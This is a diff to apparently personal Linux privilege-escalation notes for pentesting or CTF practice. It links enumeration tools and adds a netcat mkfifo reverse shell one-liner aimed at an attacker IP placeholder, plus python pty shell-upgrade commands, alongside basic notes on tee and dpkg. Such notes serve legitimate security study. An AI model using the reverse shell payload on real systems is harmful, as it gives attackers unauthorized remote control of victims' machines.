@@ -1,4 +1,4 @@
-# Privilege Escalation  
+# Privilege Escalation  😈
 
 ### LinPEAS
 
@@ -11,13 +11,28 @@
 ### LinEnum   
 * You can also check it's github page <a href="https://github.com/rebootuser/LinEnum">Here</a> .
 
-### LInux-Smart-Enumera
+### Linux-Smart-Enumeration
+* Check out the github page right <a href="https://github.com/diego-treitos/linux-smart-enumeration">here</a>.
 
 ### Pspy   
 
 ### Exploits on ExploitDB
 * Exploits are saved in the following path `/usr/share/exploitdb/exploits`
 
+
+### Most Reliable Reverse Shell Payload  
+	```console
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
+	```
+
+### Spawn a Shell When Connecting to a Reverse Shell   
+	```console
+	python -c 'import pty;pty.spawn("/bin/bash");'
+
+	//or
+
+	python3 -c 'import pty;pty.spawn("/bin/bash");'
+	```
 
 ### Upgrade the Reverse Shell   
 
@@ -132,6 +147,18 @@ Note that we used the command 'chmod 600 id_rsa' on the key after we created it 
   ```  
 
 * To check that we didn't miss anything up during the encoding/deconding process we can use the command `md5sum [FILENAME]` on both machines and check if they're equal.  
+
+
+### The Shells on Victims   
+* We can find the shells that can be used on the victim's machine with the following command in the following file   `cat /etc/shells`.
+
+### The `tee` Command
+
+* Store the output of a command in a file with the following command `[COMMAND] | tee [FILE NAME]`.   
+
+### The `dpkg -l`  Command   
+* Shows the packages and libraries on the system.
+* Is it exclusively used on Debian based Linux? Seems so -- not sure tho.🤔
 
 
 
